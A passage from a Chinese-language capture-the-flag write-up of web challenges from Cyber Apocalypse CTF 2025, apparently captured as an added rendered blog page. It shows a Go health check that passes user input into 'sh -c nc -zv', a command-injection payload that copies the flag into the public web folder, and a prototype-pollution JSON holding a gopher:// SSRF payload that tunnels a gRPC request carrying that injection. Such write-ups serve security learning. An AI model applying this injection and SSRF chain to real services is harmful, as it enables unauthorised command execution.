+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HealthCheckResponse</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;healthy&#34;</span><span class="p">},</span><span class="w"> </span><span class="kc">nil</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">healthCheck</span><span class="p">(</span><span class="nx">ip</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">cmd</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;nc -zv &#34;</span><span class="o">+</span><span class="nx">ip</span><span class="o">+</span><span class="s">&#34; &#34;</span><span class="o">+</span><span class="nx">port</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">output</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;Health check failed: %v, output: %s&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;health check failed: %v&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;Health check succeeded: output: %s&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>显而易见<code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;nc -zv &quot;+ip+&quot; &quot;+port)</code>这里就是最后执行命令的地方，因为过滤不严格直接做了拼接，所以我们可以这样子赋值port</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">1337<span class="p">;</span> cp /flag* /app/eldoria_api/public/flag.txt</span></span></code></pre></div></div>
+<p>所以最后解题
+先污染</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;class&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;superclass&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;realm_url&#34;</span><span class="p">:</span> <span class="s2">&#34;gopher://127.0.0.1:50051/_%50%52%49%20%2a%20%48%54%54%50%2f%32%2e%30%0d%0a%0d%0a%53%4d%0d%0a%0d%0a%00%00%00%04%01%00%00%00%00%00%00%7c%01%04%00%00%00%01%83%86%45%98%62%83%77%2a%f9%cd%dc%b7%c6%91%ee%2d%9d%cc%42%b1%7a%72%93%ae%32%8e%84%cf%41%8b%a0%e4%1d%13%9d%09%b8%d8%00%d8%7f%5f%8b%1d%75%d0%62%0d%26%3d%4c%4d%65%64%7a%a5%9a%ca%c9%6d%94%31%21%7b%ad%1d%a6%a2%45%3f%aa%8e%a7%72%d8%83%1e%a5%10%54%ff%6a%4d%65%64%5a%63%b0%15%db%75%70%7f%40%02%74%65%86%4d%83%35%05%b1%1f%40%8e%9a%ca%c8%b0%c8%42%d6%95%8b%51%0f%21%aa%9b%83%9b%d9%ab%00%00%42%00%01%00%00%00%01%00%00%00%00%3d%0a%09%31%32%37%2e%30%2e%30%2e%31%12%30%31%33%33%37%3b%20%63%70%20%2f%66%6c%61%67%2a%20%2f%61%70%70%2f%65%6c%64%6f%72%69%61%5f%61%70%69%2f%70%75%62%6c%69%63%2f%66%6c%61%67%2e%74%78%74&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>然后connect一下
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/18.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/18.png, /img/Cyber-Apocalypse-CTF-2025-WEB/18.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/18.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/18.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/18.png" />
+最后访问一下/flag.txt即可</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp" data-hashtags="WP,SSTI,SSRF,Apache,Ruby"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-hashtag="WP"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" data-title="Cyber Apocalypse CTF 2025 部分web wp" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fcyber-apocalypse-ctf-2025-web%2f&amp;text=Cyber%20Apocalypse%20CTF%202025%20%e9%83%a8%e5%88%86web%20wp" target="_blank" title="Share on Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/wp/">WP</a>,&nbsp;<a href="/tags/ssti/">SSTI</a>,&nbsp;<a href="/tags/ssrf/">SSRF</a>,&nbsp;<a href="/tags/apache/">Apache</a>,&nbsp;<a href="/tags/ruby/">Ruby</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="Pydash原型链污染链子分析"><i class="fas fa-angle-left" aria-hidden="true"></i>Pydash原型链污染链子分析</a>
+            <a href="/posts/n1junior2025/" class="next" rel="next" title="N1junior2025">N1junior2025<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.153.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/fuse/fuse.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/js/title-transition-fallback.js"></script><script src="/js/page-back.js"></script><script src="/js/image-scroll-fade.js"></script><script>window.config={"comment":{},"search":{"fuseIndexURL":"/index.json","fuseOpts":{"distance":100,"findAllMatches":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"minMatchCharLength":2,"threshold":0.3},"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"fuse"}};</script><script src="/js/theme.js"></script></body>
+</html>
